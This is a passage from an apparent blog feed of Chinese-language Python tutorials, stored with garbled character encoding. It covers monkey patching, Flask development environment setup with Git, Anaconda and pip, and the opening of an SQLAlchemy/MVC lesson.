å‰è¨€Python æ˜¯è¿‘ä¾†ååˆ†ç«ç´…çš„ç¨‹å¼èªè¨€ï¼Œä¸ç®¡æ˜¯ç¶²ç«™é–‹ç™¼ã€éŠæˆ²é–‹ç™¼æˆ–æ˜¯è³‡æ–™ç§‘å­¸éƒ½å¯ä»¥çœ‹è¦‹ Python çš„èº«å½±ï¼Œæœ¬ç³»åˆ—æ–‡ç« å°‡é€éè¤‡ç¿’ Python å° tipsï¼Œè®“è®€è€…å¯ä»¥é‡æ–°èªè­˜ Pythonã€‚é€™æ¬¡æˆ‘å€‘å…ˆä¾†èªè­˜ä¸€ä¸‹ Monkey Patch é€™å€‹ç¨‹å¼è¨­è¨ˆä¸Šçš„å°æŠ€å·§ã€‚
ä»€éº¼æ˜¯ Monkey Patchç°¡å–®ä¾†èªªï¼ŒMonkey Patch å°±æ˜¯åœ¨ run time æ™‚å‹•æ…‹æ›´æ”¹ class æˆ–æ˜¯ module å·²ç¶“å®šç¾©å¥½çš„å‡½æ•¸æˆ–æ˜¯å±¬æ€§å…§å®¹ã€‚å¯¦å‹™ä¸Šå¸¸è¦‹çš„ä½¿ç”¨åœ¨ test ä¸Šç”¨ä¾† mock è¡Œç‚ºæˆ–æ˜¯ gevent å‡½å¼åº«ç­‰ã€‚
A MonkeyPatch is a piece of Python code which extends or modifies other code at runtime (typically at startup).

è£½ä½œç¬¬ä¸€å€‹ Python Monkey Patchæˆ‘å€‘é€™é‚Šé–‹äº†ä¸€å€‹ç°¡å–®çš„ monkey.py æª”æ¡ˆï¼Œè£¡é¢æ”¾ç½® demo ç”¨çš„ classï¼šMyClassï¼Œè£¡é¢æœ‰å€‹ method å« fï¼Œæœƒåˆ—å°å‡º f() å­—ä¸²ï¼Œ
# monkey.pyclass MyClass:    def f(self):        print &#x27;f()&#x27;

æ­¤æ™‚æˆ‘å€‘åœ¨å¦å¤–ä¸€å€‹ main.py æª”æ¡ˆå¼•å…¥ monkey moduleï¼Œä¸¦æ›¿æ›æ‰ f function ç‚º monkey_fï¼Œé€™æ¨£å®šç¾©çš„å‡ºä¾†çš„ instance å‘¼å«æ–¹æ³• f() å°å‡ºçš„å‰‡ç‚º monkey_f()
# main.pyimport monkeydef monkey_f(self):    print &#x27;monkey_f()&#x27; monkey.MyClass.f = monkey_fobj = monkey.MyClass()obj.f()# monkey_f()

ç¸½çµä»¥ä¸Šå°±æ˜¯ Python Monkey Patch ç°¡å–®ä»‹ç´¹ï¼ŒPython Monkey Patch ä¸»è¦ç”¨æ–¼å‹•æ…‹æ–¼ run time æ”¹è®Š class çš„å±¬æ€§æˆ–æ˜¯æ–¹æ³•ï¼Œå¯¦å‹™ä¸Šå¸¸è¦‹çš„ä½¿ç”¨åœ¨ test ä¸Šç”¨ä¾† mock è¡Œç‚ºæˆ–æ˜¯ gevent å‡½å¼åº«ç­‰åœ°æ–¹ã€‚
å»¶ä¼¸é–±è®€
æºç åˆ†æä¹‹gevent monkey.patch_allå®ç°åŸç†
What is monkey patching?
Monkey-patching in Python: a magic trick or a powerful tool?

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
ï¼ˆimage via semaphoreciï¼‰
]]></content>
      <tags>
        <tag>Python çŒ´å­è£œä¸ Monkey Patch</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Web Flask å¯¦æˆ°é–‹ç™¼æ•™å­¸ - ç°¡ä»‹èˆ‡ç’°å¢ƒå»ºç½®</title>
    <url>/2017/06/03/python-web-flask101-tutorial-introduction-and-environment-setup/</url>
    <content><![CDATA[ 
å‰è¨€Web é–‹ç™¼æ¶‰åŠå±¤é¢å¾ˆå»£ï¼ŒåŒ…å«äº†å‰å¾Œç«¯é–‹ç™¼ã€è³‡æ–™åº«å„ªåŒ–ã€å¹³è¡Œè™•ç†ã€è² è¼‰å¹³è¡¡ã€é«˜å¯ç”¨æ€§ã€è³‡è¨Šå®‰å…¨ã€é›²ç«¯ä¼ºæœå™¨éƒ¨å±¬ç­‰è­°é¡Œï¼Œæœ¬ç³»åˆ—æ–‡ç« å°‡é€éä»‹ç´¹ Python Web Flask å¯¦æˆ°é–‹ç™¼ä¾†å­¸ç¿’ç¾ä»£åŒ–ç¶²ç«™é–‹ç™¼çš„æ–¹æ–¹é¢é¢ã€‚ä¸€é–‹å§‹å…ˆå¾ç°¡ä»‹å’Œç’°å¢ƒå»ºç½®é–‹å§‹å§ï¼
ä»€éº¼æ˜¯ Pythonï¼ŸPython æ˜¯ä¸€ç¨®ç‰©ä»¶å°å‘ã€ç›´è­¯å¼çš„è·¨å¹³å°é›»è…¦ç¨‹å¼èªè¨€ï¼Œå®ƒåŒ…å«äº†ä¸€çµ„åŠŸèƒ½å®Œå‚™çš„æ¨™æº–åº«å’Œè±å¯Œå¥—ä»¶ç”Ÿæ…‹ç³»ï¼Œå¯ä»¥è¼•é¬†å®Œæˆå¾ˆå¤šå¸¸è¦‹çš„ä»»å‹™ï¼ˆä¾‹å¦‚ï¼šè®€å¯«æª”æ¡ˆã€è‡ªç„¶èªè¨€è™•ç†ã€ç¶²è·¯çˆ¬èŸ²ã€ç¶²ç«™é–‹ç™¼ã€æ©Ÿå™¨å­¸ç¿’ç­‰ï¼‰ï¼Œå› ç‚ºå®ƒå¯ä»¥å¾ˆè¼•æ˜“æ•´åˆå…¶ä»–åº•å±¤èªè¨€ï¼ˆä¾‹å¦‚ï¼šC&#x2F;C++ ç­‰ï¼‰ï¼Œæ‰€ä»¥åˆç¨±ç‚ºè† æ°´èªè¨€ã€‚å®ƒçš„èªæ³•ç°¡å–®ï¼Œèˆ‡å…¶å®ƒå¤§å¤šæ•¸ç¨‹å¼è¨­è¨ˆèªè¨€ä½¿ç”¨å¤§æ‹¬å¼§ä¸ä¸€æ¨£ï¼Œå®ƒä½¿ç”¨ç©ºç™½ç¸®é€²ä¾†å®šç¾©èªå¥å¡Šã€‚ç”±æ–¼å…·å‚™ç°¡æ½”æ˜“å­¸ç­‰ç‰¹æ€§ï¼Œè¨±å¤šé–‹ç™¼è€…æ¨è–¦ Python ç‚ºåˆå­¸è€…ç¬¬ä¸€å€‹å­¸ç¿’çš„ç¨‹å¼èªè¨€ã€‚ç”±æ–¼ç‰ˆæœ¬æ›´è¿­ï¼Œæˆ‘å€‘æ¥ä¸‹ä¾†è¨è«–çš„ä¸»è¦æ˜¯ä»¥ Python3 ç‚ºä¸»ï¼Œè‹¥é›»è…¦æ²’æœ‰å®‰è£çš„è©±ï¼Œä½ å¯ä»¥åœ¨å®˜æ–¹ç¶²ç«™ä¸‹è¼‰ï¼Œè‹¥ä½ ä¸æ˜¯å®‰è£ Anaconda é€™å€‹ all-in-one ç‰ˆæœ¬çš„è©±ï¼ˆè‡ªå¸¶è¨±å¤šå¥—ä»¶å’Œç§‘å­¸é‹ç®—å·¥å…·ï¼Œä¹Ÿå¯ä»¥å»ºç«‹è™›æ“¬é–‹ç™¼ç’°å¢ƒï¼‰ï¼Œè¨˜å¾—è¦å®‰è£ pipã€IPythonã€‚ 
æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»¥ Anaconda é€™å€‹é–‹ç™¼ç’°å¢ƒç‚ºä¸»è¦è¬›è§£ç’°å¢ƒã€‚ç”±æ–¼æˆ‘å€‘å‡å®šè®€è€…å·²ç¶“æœ‰ä¸€äº› Python åŸºç¤ï¼Œæ‰€ä»¥æˆ‘å€‘æœƒè·³éæœ‰é—œ Python èªæ³•çš„åŸºæœ¬æ•™å­¸ã€‚
ä»€éº¼æ˜¯ Flaskï¼Ÿ 
Flask æ˜¯ä¸€å€‹ä½¿ç”¨ Python æ’°å¯«çš„è¼•é‡ç´š Web æ‡‰ç”¨ç¨‹å¼æ¡†æ¶ï¼Œç”±æ–¼å…¶è¼•é‡ç‰¹æ€§ï¼Œä¹Ÿç¨±ç‚º micro-frameworkï¼ˆå¾®æ¡†æ¶ï¼‰ã€‚Flask æ ¸å¿ƒååˆ†ç°¡å–®ï¼Œä¸»è¦æ˜¯ç”± Werkzeug WSGI å·¥å…·ç®±å’Œ Jinja2 æ¨¡æ¿å¼•æ“æ‰€çµ„æˆï¼ŒFlask å’Œ Django ä¸åŒçš„åœ°æ–¹åœ¨æ–¼ Flask çµ¦äºˆé–‹ç™¼è€…éå¸¸å¤§çš„å½ˆæ€§ï¼ˆç•¶ç„¶ä½ ä¹Ÿå¯ä»¥èªªæ˜¯éœ€è¦æ€è€ƒæ›´å¤šäº‹æƒ…ï¼‰ï¼Œå¯ä»¥é¸ç”¨ä¸åŒçš„ç”¨çš„ extension ä¾†å¢åŠ å…¶åŠŸèƒ½ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒDjango é›–ç„¶å®Œå–„ä½†æŠ€è¡“é¸æ“‡ç›¸å°ä¸å½ˆæ€§ï¼Œä¸è«–æ˜¯ ORMã€è¡¨å–®é©—è­‰æˆ–æ˜¯æ¨¡ç‰ˆå¼•æ“éƒ½æœ‰è‡ªå·±çš„ä½œæ³•ã€‚äº‹å¯¦ä¸Šæ²’æœ‰æœ€å¥½çš„æ¡†æ¶ï¼Œåªæœ‰åˆé©çš„ä½¿ç”¨æƒ…å¢ƒï¼ŒDjango ç›¸æ¯”ä¹‹ä¸‹é©åˆéœ€è¦å¿«é€Ÿçš„é–‹ç™¼å¤§å‹çš„æ‡‰ç”¨ç¨‹å¼ï¼Œå’Œ Ruby ä¸­çš„ Ruby on Rails ç›¸ä¼¼ï¼Œè€Œ Flask å‰‡æ˜¯ç›¸å°è¼•é‡å½ˆæ€§ï¼Œæ›´åƒæ˜¯ Ruby ç•Œçš„ Sinatraã€‚è‹¥è®€è€…æƒ³å…ˆé«”é©—çœ‹çœ‹ Flask çš„ç¨‹å¼ç‹€æ³ï¼Œä»¥ä¸‹æ˜¯ Flask ç°¡æ˜“é‹è¡Œçš„ç¨‹å¼ï¼Œå•Ÿå‹•æ¸¬è©¦ä¼ºæœå™¨å¾Œï¼Œå¯ä»¥åœ¨ç€è¦½å™¨ä¸­ï¼ˆhttp://localhost:5000/ï¼‰å°å‡º Hello World!ã€‚
index.pyfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def hello():    return &quot;Hello World!&quot;if __name__ == &quot;__main__&quot;:    app.run()

Python Web é–‹ç™¼ç’°å¢ƒå»ºç½®æ‰€è¬‚å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ï¼Œè¦é–‹ç™¼å¥½çš„æ‡‰ç”¨ç¨‹å¼å¿…é ˆå…ˆæº–å‚™å¥½é–‹ç™¼ç’°å¢ƒæ‰è¡Œã€‚ä»¥ä¸‹ä»‹ç´¹æˆ‘å€‘åœ¨æ¥ä¸‹ä¾†é–‹ç™¼ Python Flask Web æ‡‰ç”¨ç¨‹å¼æ‰€éœ€è¦å®‰è£çš„é–‹ç™¼ç’°å¢ƒå·¥å…·ï¼ˆä»¥ä¸‹ä»¥ Mac OS ç­‰ Unix-like ä½œæ¥­ç³»çµ±ç‚ºç¤ºç¯„ï¼Œè‹¥æ˜¯ Windows ä½¿ç”¨è€…å»ºè­°å®‰è£ Virtualbox ä¸¦é‹è¡Œ Linux Ubuntu ä½œæ¥­ç³»çµ±ï¼Œåƒè€ƒå®‰è£æ–‡ä»¶ï¼‰ï¼š

Microsoft VSCode ç·¨è¼¯å™¨ Microsoft VSCode æ˜¯ Microsoft æ¨å‡ºçš„ç·¨è¼¯å™¨ï¼ˆéæ•´åˆé–‹ç™¼ç’°å¢ƒ IDEï¼‰ï¼Œå¤¾å¸¶è‘— Microsoft éå»æ‰“é€  Visual studio æ•´åˆé–‹ç™¼ç’°å¢ƒçš„è±å¯Œç¶“é©—ï¼Œç›¸æ¯” Sublime Text å’Œå…¶ä»–ç·¨è¼¯å™¨ï¼ŒVSCode çš„å„ªå‹¢åœ¨æ–¼é–‹æºä¸”æ´»èºçš„é–‹ç™¼ç¤¾ç¾¤ã€å…§å»º debugger æ¡†æ¶ã€åŸç”Ÿ Git æ•´åˆã€å¥—ä»¶æ•´åˆå®¹æ˜“ç­‰ç‰¹æ€§ã€‚æ‰€ä»¥å°æ–¼åˆå­¸è€…ä¾†èªª VSCode æ˜¯ä¸€å€‹è »é©åˆå…¥é–€çš„é–‹ç™¼ç’°å¢ƒã€‚å®ƒçš„å®‰è£æ–¹å¼ä¹Ÿååˆ†ç°¡æ˜“ï¼Œåœ¨å®˜ç¶²ä¸‹è¼‰å¾ŒæŒ‰ç…§æŒ‡ç¤ºå®‰è£å®Œæˆå³å¯ã€‚
  
 æˆ‘å€‘å¯ä»¥å®‰è£ Python èªæ³•å’Œæ ¼å¼æª¢æŸ¥çš„ç›¸é—œ Python å¥—ä»¶å¹«åŠ©é™¤éŒ¯ï¼š
  

çµ‚ç«¯æ©Ÿç’°å¢ƒï¼ˆiTterm&#x2F;å…§å»º terminalï¼‰ terminalï¼ˆçµ‚ç«¯æ©Ÿï¼‰æ˜¯æˆ‘å€‘ä¸‹æŒ‡ä»¤çš„åœ°æ–¹ï¼Œè¨±å¤šæ™‚å€™æˆ‘å€‘é€²è¡Œç¨‹å¼é–‹ç™¼æ™‚ä¸æœƒä½¿ç”¨ GUI çš„ä»‹é¢è€Œæ˜¯ä½¿ç”¨ä¸‹æŒ‡ä»¤æ–¹å¼è«‹é›»è…¦åšç›¸å°æ‡‰çš„è¡Œç‚ºã€‚åœ¨ Linux å’Œ Mac è£¡é¢éƒ½æœ‰å…§å»ºçš„ terminal çš„æ‡‰ç”¨ç¨‹å¼ï¼Œè‹¥ä½ æ˜¯ Mac ç”¨æˆ¶æƒ³ä½¿ç”¨æ›´ä¾¿åˆ©çš„å·¥å…·ï¼ˆåˆ†å‰²è¦–çª—ã€ç†±éµã€æœå°‹ã€è‡ªå‹•è£œå®Œç­‰ï¼‰å¯ä»¥é¡å¤–å®‰è£ iterm2 åšä½¿ç”¨ã€‚
  
 ä¸‹æŒ‡ä»¤ï¼ˆ$ ç‚ºæç¤ºå­—å…ƒï¼Œä¸ç”¨è¼¸å…¥ï¼‰ï¼š
  
 å°æ–¼æœ‰å¿—æ–¼å¾äº‹ç¨‹å¼é–‹ç™¼ç›¸é—œå·¥ä½œçš„è®€è€…å»ºè­°å¯ä»¥å¤šç†Ÿæ‚‰æŒ‡ä»¤ç¢¼çš„è¼¸å…¥ï¼Œæ›´å¤šæŒ‡ä»¤ç¢¼å¯ä»¥åƒè€ƒé³¥å“¥æ’°å¯«çš„ Linux åŸºæœ¬æŒ‡ä»¤ä»‹ç´¹ å’Œ Linux å­¸ç¿’è³‡æºã€‚

Git ç‰ˆæœ¬æ§åˆ¶ç³»çµ±&#x2F;è¨»å†Š GitHub å¸³æˆ¶ Git æ˜¯ä¸€ç¨®åˆ†æ•£å¼ç‰ˆæœ¬æ§åˆ¶ç³»çµ±ï¼Œå¯ä»¥è®“æˆ‘å€‘å¯ä»¥æ›´æ–¹ä¾¿åœ°ç®¡ç†æˆ‘å€‘çš„ç¨‹å¼ç¢¼ã€‚åœ¨ç¶²è·¯ä¸Šæœ‰éå¸¸å¤šå„ªç§€çš„ Git æ•™å­¸æ–‡ä»¶ï¼ˆé€£çŒ´å­éƒ½èƒ½æ‡‚çš„Gitå…¥é–€æŒ‡å—ã€å¯«çµ¦å¤§å®¶çš„ Git æ•™å­¸ã€åˆå¿ƒè€… Git ä¸Šæ‰‹æ”»ç•¥ï¼‰ã€‚å®‰è£ Git æ–¹å¼æ˜¯åˆ°å®˜ç¶²ä¸‹è¼‰è»Ÿé«”ï¼Œä¾ç…§æŒ‡ç¤ºå®‰è£ã€‚
  
 äº’å‹•å¼èªæ³•å­¸ç¿’ï¼š
  
 åœ¨ä»‹ç´¹å®Œ git ä¹‹å¾Œæˆ‘å€‘ä¾†äº†è§£ä¸€ä¸‹ GitHubã€‚GitHub æ˜¯ä¸€å€‹å¯ä»¥å­˜æ”¾ git ç¨‹å¼ç¢¼å°ˆæ¡ˆçš„å¹³å°ï¼Œé€é GitHub æˆ‘å€‘å¯ä»¥æ¥è§¸åˆ°æœ€æ–°çš„é–‹æ”¾åŸå§‹ç¢¼è³‡è¨Šï¼Œä¹Ÿå¯ä»¥å°‡æˆ‘å€‘çš„ç¨‹å¼ç¢¼é–‹æºå‡ºä¾†ã€‚
  
 å¾ GitHub ä¸Šè¤‡è£½ç¨‹å¼ç¢¼
  
 # è¤‡è£½ä¸€ä»½åˆ°æœ¬åœ°ç«¯$ git clone https://github.com/kdchang/flask101.git# ç§»å‹•åˆ°è³‡æ–™å¤¾$ cd flask101

 å¸¸è¦‹ Git æŒ‡ä»¤ï¼š
 # åˆå§‹åŒ–å°ˆæ¡ˆ$ git init# æŸ¥çœ‹ç‹€æ…‹$ git status# æª¢æŸ¥å·®ç•°$ git diff # å°‡è®Šæ›´æª”æ¡ˆæ”¾å…¥æš«å­˜å€$ git add index.py# ä½¿ç”¨ commit -m æäº¤è®Šæ›´$ git -a -m &#x27;init commit&#x27;# æŸ¥çœ‹æ­·å²$ git log# æ”¾æ£„å·²ç¶“ commit çš„æª”æ¡ˆé‡å›æš«å­˜å€$ git reset HEAD index.py# æ”¾æ£„æª”æ¡ˆè®Šæ›´$ git checkout index.py

Anaconda Python3 ç‰ˆæœ¬ Anaconda æ˜¯ä¸€å€‹ all-in-one çš„ Python é–‹ç™¼ç’°å¢ƒï¼Œå°æ–¼åˆå­¸è€…ä¾†èªªæ˜¯å€‹ååˆ†åˆé©çš„é–‹ç™¼ç’°å¢ƒåŒ…ã€‚Anaconda å…·å‚™äº†å¹¾é …ç‰¹é»ï¼š

ä¾¿æ–¼å®‰è£è¨±å¤šæµè¡Œçš„ç§‘å­¸ã€æ•¸å­¸ã€å·¥ç¨‹ã€æ•¸æ“šåˆ†æçš„ Python æ¨¡çµ„  
é–‹æºå’Œå…è²»
è·¨å¹³å°æ”¯æŒï¼šLinuxã€Windowsã€Mac
æ”¯æŒ Python ç‰ˆæœ¬åˆ‡æ›ï¼Œæ–¹ä¾¿å»ºç«‹ä¸åŒçš„è™›æ“¬é–‹ç™¼ç’°å¢ƒ
å…§å»º Spyder ç·¨è¼¯å™¨å’Œ Jupyter Notebook ç’°å¢ƒ

 å®‰è£æµç¨‹ä¹Ÿååˆ†ç°¡å–®ï¼Œé€²å…¥ Anaconda é¦–é ï¼Œé¸æ“‡å°æ‡‰ä½œæ¥­ç³»çµ±ï¼ˆé€™é‚Šä½¿ç”¨ Mac OSï¼‰ï¼š 
 é¸æ“‡å°æ‡‰ Python ç‰ˆæœ¬ä¸‹è¼‰ï¼Œæˆ‘å€‘ä½¿ç”¨ Graphical Installerï¼ˆåœ–åƒä»‹é¢å®‰è£æ–¹å¼ï¼‰ï¼Œæ¥è‘—åœ¨ä¸‹è¼‰å®Œæˆæ™‚æŒ‰ç…§é è¨­çš„å®‰è£æ–¹å¼å®Œæˆå®‰è£ï¼›  
 è‹¥æ˜¯å®Œæ•´å®‰è£æˆåŠŸï¼Œå¯ä»¥æ‰“é–‹çµ‚ç«¯æ©Ÿè¼¸å…¥ï¼Œè‹¥æ˜¯é¡¯ç¤º Python 3.6.0 :: Anaconda 4.3.0 (x86_64) ç‰ˆæœ¬è™Ÿå³å®‰è£æˆåŠŸï¼š
 $ python -VPython 3.6.0 :: Anaconda 4.3.0 (x86_64)

 æ¥è‘—è¦å»ºç«‹æˆ‘å€‘å°ˆæ¡ˆè™›æ“¬ç’°å¢ƒï¼Œé€™æ¨£åœ¨å®‰è£æ“ä½œå¥—ä»¶æ™‚æ¯”è¼ƒä¸å®¹æ˜“è¢«æ±¡æŸ“åˆ° root çš„ç’°å¢ƒï¼Œå•Ÿå‹•å¾Œæœƒå‡ºç¾ï¼ˆå¥—ä»¶åç¨±ï¼‰çš„æç¤ºå­—å…ƒï¼š
 # é¡¯ç¤ºç›®å‰è™›æ“¬ç’°å¢ƒåˆ—è¡¨$ conda info -e # å‰µå»ºè™›æ“¬ç’°å¢ƒ$ conda create -n å¥—ä»¶åç¨± python=3.6# é€²å…¥è™›æ“¬ç’°å¢ƒï¼ˆè‹¥æ˜¯ Windows cmder ç’°å¢ƒä¸ç”¨åŠ  sourceï¼‰ ï¼ŒæˆåŠŸå¾Œæç¤ºå­—å…ƒè®Šæˆï¼šï¼ˆå¥—ä»¶åç¨±ï¼‰$$ source activate å¥—ä»¶åç¨±# é›¢é–‹è™›æ“¬ç’°å¢ƒï¼ˆè‹¥æ˜¯ Windows cmder ç’°å¢ƒä¸ç”¨åŠ  sourceï¼‰ $ source deactivate 

å»ºç«‹ç¬¬ä¸€å€‹ Flask é–‹ç™¼å°ˆæ¡ˆä½¿ç”¨ pip ç®¡ç† Python æ¨¡çµ„# å®‰è£æ¨¡çµ„$ pip install æ¨¡çµ„å# ç§»é™¤æ¨¡çµ„$ pip uninstall æ¨¡çµ„å# æœå°‹æ¨¡çµ„$ pip search æ¨¡çµ„å

é€šå¸¸é–‹ç™¼å°ˆæ¡ˆæ™‚æˆ‘å€‘æœƒå°‡å·²å®‰è£æ¨¡çµ„åç¨±å’Œç‰ˆæœ¬è™Ÿå­˜æˆä¸€å€‹åˆ—è¡¨ï¼Œä»¥ä¾¿ä¸‹æ¬¡å®‰è£ä½¿ç”¨ï¼š
$ pip freeze &gt; requirements.txt

æ ¹æ“š requirements.txt åˆ—è¡¨å®‰è£æ¨¡çµ„ï¼š
$ pip install -r requirements.txt

å»ºç«‹è™›æ“¬ç’°å¢ƒåœ¨äº†è§£ pip å¥—ä»¶ç®¡ç†å·¥å…·å¾Œæˆ‘å€‘æ­£å¼ä¾†å»ºç«‹ä¸€å€‹ Flask çš„å°ˆæ¡ˆï¼š
å»ºç«‹å°ˆæ¡ˆè³‡æ–™å¤¾
$ mkdir python-flask-todo-app$ cd python-flask-todo-app

å»ºç«‹ç¨ç«‹è™›æ“¬ç’°å¢ƒ
$ conda create -n python-flask-todo-app python=3.6$ source activate python-flask-todo-app

å®‰è£ Flask æ¨¡çµ„
$ pip install flask

è¨­å®š Config è¨­å®šæª”æ¡ˆå»ºç«‹è¨­å®šæª” config.py æª”æ¡ˆåœ¨å°ˆæ¡ˆè³‡æ–™å¤¾çš„æ ¹ç›®éŒ„ä¸­ï¼š
class Config(object):    passclass ProdConfig(Config):    passclass DevConfig(Config):    DEBUG = True

å»ºç«‹ä¸€å€‹ main.py æª”æ¡ˆåˆå§‹åŒ– Flask App å’Œä½¿ç”¨å…¶ APIï¼Œè‹¥æ˜¯ä¸€åˆ‡æ­£å¸¸åœ¨çµ‚ç«¯æ©ŸåŸ·è¡Œ python main.py æœƒåœ¨ç€è¦½å™¨ç¶²å€åˆ—è¼¸å…¥ localhost:5000 å¾Œçœ‹åˆ° Hello World äº†ï¼
main.pyfrom flask import Flaskfrom config import DevConfig# åˆå§‹åŒ– Flask é¡åˆ¥æˆç‚º instanceapp = Flask(__name__)app.config.from_object(DevConfig)# è·¯ç”±å’Œè™•ç†å‡½å¼é…å°@app.route(&#x27;/&#x27;)def index():    return &#x27;Hello World!&#x27;# åˆ¤æ–·è‡ªå·±åŸ·è¡Œéè¢«ç•¶åšå¼•å…¥çš„æ¨¡çµ„ï¼Œå› ç‚º __name__ é€™è®Šæ•¸è‹¥è¢«ç•¶åšæ¨¡çµ„å¼•å…¥ä½¿ç”¨å°±ä¸æœƒæ˜¯ __main__if __name__ == &#x27;__main__&#x27;:    app.run()

ä½¿ç”¨ Flask ScriptFlask Script æ˜¯ Flask å¸¸ç”¨çš„ extensionsï¼Œå¯ä»¥è®“æˆ‘å€‘ä½¿ç”¨æŒ‡ä»¤åˆ—ä¾†æ“ä½œ Flask ç¨‹å¼ä¸¦åœ¨ shell ç’°å¢ƒä¸‹æ“ä½œ app contextï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
å®‰è£æ¨¡çµ„
$ pip install flask-script

å»ºç«‹ manage.py æ–¼æ ¹ç›®éŒ„
manage.pyfrom flask_script import Manager, Serverfrom main import app# è¨­å®šä½ çš„ appmanager = Manager(app)# è¨­å®š python manage.py runserver ç‚ºå•Ÿå‹• server æŒ‡ä»¤manager.add_command(&#x27;runserver&#x27;, Server())# è¨­å®š python manage.py shell ç‚ºå•Ÿå‹•äº’å‹•å¼æŒ‡ä»¤ shell çš„æŒ‡ä»¤ @manager.shelldef make_shell_context():    return dict(app=app)if __name__ == &#x27;__main__&#x27;:    manager.run()

ç•¶åŸ·è¡Œ $ python manage.py runserver å³æœƒåŸ·è¡Œæ¸¬è©¦ä¼ºæœå™¨ï¼Œ$ python manage.py shell å¯ä»¥åœ¨å°è©±æŒ‡ä»¤åˆ—ä¸­ä¸­è¼¸å…¥ app æ‰¾åˆ°è¢«å¼•å…¥çš„ &lt;Flask &#39;main&#39;&gt;ï¼Œå¯ä»¥è®“æˆ‘å€‘åœ¨äº’å‹•å¼æŒ‡ä»¤å°è©±æ¡†ä¸­æ¸¬è©¦æ“ä½œä½¿ç”¨ã€‚
ç¸½çµæœ¬æ–‡ä»‹ç´¹äº†å¦‚ä½•å»ºç½® Python Web é–‹ç™¼ç’°å¢ƒï¼Œæˆ‘å€‘ä¹Ÿå¯¦éš›å®Œæˆäº†æˆ‘å€‘ç¬¬ä¸€å€‹ Python Flask ç¨‹å¼ã€‚åœ¨æ¥ä¸‹ä¾†ç« ç¯€ä¸­æˆ‘å€‘å°‡æŒçºŒä»‹ç´¹ Python Web Flask å¯¦æˆ°é–‹ç™¼ï¼Œä¸¦å­¸ç¿’ç¾ä»£åŒ–ç¶²ç«™é–‹ç™¼çš„æ–¹æ–¹é¢é¢ã€‚
å»¶ä¼¸é–±è®€
Wiki Flask (web framework)
Python Web ç¨‹å¼è¨­è¨ˆå…¥é–€å¯¦æˆ°ç·šä¸Šèª²ç¨‹

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
ï¼ˆimage via fedoramagazineï¼‰
]]></content>
      <tags>
        <tag>Python, Django, MVC, Web, MTV, Web Backend, Web Framework, æ•™å­¸, Flask, æ¡†æ¶, ç¶²ç«™é–‹ç™¼, Anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Web Flask å¯¦æˆ°é–‹ç™¼æ•™å­¸ - SQLAlchemy èˆ‡ ORM</title>
    <url>/2017/08/12/python-web-flask101-tutorial-sqlalchemy-orm-database-models/</url>
    <content><![CDATA[ 
å‰è¨€Web é–‹ç™¼æ¶‰åŠå±¤é¢å¾ˆå»£ï¼ŒåŒ…å«äº†å‰å¾Œç«¯é–‹ç™¼ã€è³‡æ–™åº«å„ªåŒ–ã€å¹³è¡Œè™•ç†ã€è² è¼‰å¹³è¡¡ã€é«˜å¯ç”¨æ€§ã€è³‡è¨Šå®‰å…¨ã€é›²ç«¯ä¼ºæœå™¨éƒ¨å±¬ç­‰è­°é¡Œï¼Œæœ¬ç³»åˆ—æ–‡ç« å°‡é€éä»‹ç´¹ Python Web Flask å¯¦æˆ°é–‹ç™¼ä¾†å­¸ç¿’ç¾ä»£åŒ–ç¶²ç«™é–‹ç™¼çš„æ–¹æ–¹é¢é¢ã€‚ä¸Šä¸€ç¯‡æˆ‘å€‘å®Œæˆäº†ç’°å¢ƒå»ºç½®ï¼Œé€™ä¸€å–®å…ƒæˆ‘å€‘å°‡é€²å…¥ MVC æ¶æ§‹çš„ Models éƒ¨åˆ†ä¸¦å­¸ç¿’å¦‚ä½•ä½¿ç”¨ SQLAlchemy å»ºç«‹å’Œè³‡æ–™åº«äº’å‹•çš„ ORM æ©Ÿåˆ¶ã€‚
 
ä»€éº¼æ˜¯ MVCï¼ŸMVC æ¨¡å¼ï¼ˆModelâ€“viewâ€“controllerï¼‰æ˜¯è»Ÿé«”å·¥ç¨‹ä¸­çš„ä¸€ç¨®è»Ÿé«”æ¶æ§‹æ¨¡å¼ï¼ŒæŠŠè»Ÿé«”ç³»çµ±åˆ†ç‚ºä¸‰å€‹åŸºæœ¬éƒ¨åˆ†ï¼šæ¨¡å‹ï¼ˆModelï¼‰ã€è¦–åœ–ï¼ˆViewï¼‰å’Œæ§åˆ¶å™¨ï¼ˆControllerï¼‰ã€‚

æ§åˆ¶å™¨ï¼ˆControllerï¼‰- å° Request&#x2F;Response é€²è¡Œè™•ç†ä¸¦é€é Controller æŠŠ Model çš„è³‡æ–™ä¸²æ¥åˆ° Viewï¼ˆTemplatesï¼‰ã€‚ 
è¦–åœ–ï¼ˆViewï¼‰ - ç›´æ¥é¢å°ä½¿ç”¨è€…çš„ä½¿ç”¨è€…ä»‹é¢è¨­è¨ˆã€‚
æ¨¡å‹ï¼ˆModelï¼‰ - è² è²¬å’Œè³‡æ–™åº«äº’å‹•ï¼Œå„²å­˜è³‡æ–™ã€‚

